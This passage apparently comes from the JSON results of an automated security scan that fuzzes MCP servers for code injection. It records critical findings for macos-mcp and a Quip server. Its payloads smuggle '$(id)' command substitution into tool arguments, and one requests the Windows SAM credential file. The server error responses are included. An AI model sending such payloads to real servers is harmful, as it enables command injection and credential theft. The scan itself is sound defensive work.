+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Command failed: python3 -c \\'import Quartz\\nimport sys\\n\\ndef merge_pdfs(input_paths, output_path):\\n    pdf_out = Quartz.CGPDFDocumentCreateWithURL(None)\\n    context = Quartz.CGPDFContextCreateWithURL(\\n        Quartz.CFURLCreateWithFileSystemPath(None, output_path, Quartz.kCFURLPOSIXPathStyle, False),\\n        None, None\\n    )\\n\\n    for input_path in input_paths:\\n        pdf = Quartz.CGPDFDocumentCreateWithURL(\\n            Quartz.CFURLCreateWithFileSystemPath(None, input_path, Quartz.kCFURLPOSIXPathStyle, False)\\n        )\\n        if pdf:\\n            for page_num in range(1, Quartz.CGPDFDocumentGetNumberOfPages(pdf) + 1):\\n                page = Quartz.CGPDFDocumentGetPage(pdf, page_num)\\n                media_box = Quartz.CGPDFPageGetBoxRect(page, Quartz.kCGPDFMediaBox)\\n                Quartz.CGContextBeginPage(context, "
+  },
+  "n": 31
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "alexlock1/macos-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "macos-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 350, 'method': 'tools/call', 'params': {'name': 'macos_pdf_merge', 'arguments': {'inputPaths': [], 'outputPath': '$(id)'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Command failed: python3 -c \\'import Quartz\\nimport sys\\n\\ndef merge_pdfs(input_paths, output_path):\\n    pdf_out = Quartz.CGPDFDocumentCreateWithURL(None)\\n    context = Quartz.CGPDFContextCreateWithURL(\\n        Quartz.CFURLCreateWithFileSystemPath(None, output_path, Quartz.kCFURLPOSIXPathStyle, False),\\n        None, None\\n    )\\n\\n    for input_path in input_paths:\\n        pdf = Quartz.CGPDFDocumentCreateWithURL(\\n            Quartz.CFURLCreateWithFileSystemPath(None, input_path, Quartz.kCFURLPOSIXPathStyle, False)\\n        )\\n        if pdf:\\n            for page_num in range(1, Quartz.CGPDFDocumentGetNumberOfPages(pdf) + 1):\\n                page = Quartz.CGPDFDocumentGetPage(pdf, page_num)\\n                media_box = Quartz.CGPDFPageGetBoxRect(page, Quartz.kCGPDFMediaBox)\\n                Quartz.CGContextBeginPage(context, "
+  },
+  "n": 32
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "@iflow-mcp/quip-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "_iflow-mcp_quip-server__npx",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 8, 'method': 'tools/call', 'params': {'name': 'quip_read_document', 'arguments': {'threadId': '$(id)'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Command failed: python -u /home/tecnico/Desktop/Pipeline/tool_mcp_guard_w2/_iflow-mcp_quip-server__npx/scripts/quip_edit.py $(id) read\\nTraceback (most recent call last):\\n  File \"/home/tecnico/Desktop/Pipeline/tool_mcp_guard_w2/_iflow-mcp_quip-server__npx/scripts/quip_edit.py\", line 1, in <module>\\n    import quip\\nModuleNotFoundError: No module named \\'quip\\'\\n'}], 'isError': True}, 'jsonrpc': '2.0', 'id': 8}"
+  },
+  "n": 33
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "@iflow-mcp/quip-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "_iflow-mcp_quip-server__npx",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 6, 'method': 'tools/call', 'params': {'name': 'quip_read_document', 'arguments': {'threadId': 'C:\\\\Windows\\\\System32\\\\config\\\\SAM'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Command failed: python -u /home/tecnico/Desktop/Pipeline/tool_mcp_guard_w2/_iflow-mcp_quip-server__npx/scripts/quip_edit.py C:\\\\Windows\\\\System32\\\\config\\\\SAM read\\nTraceback (most recent call last):\\n  File \"/home/tecnico/Desktop/Pipeline/tool_mcp_guard_w2/_iflow-mcp_quip-server__npx/scripts/quip_edit.py\", line 1, in <module>\\n    import quip\\nModuleNotFoundError: No module named \\'quip\\'\\n'}], 'isError': True}, 'jsonrpc': '2.0', 'id': 6}"
+  },
+  "n": 34
+ }
+]
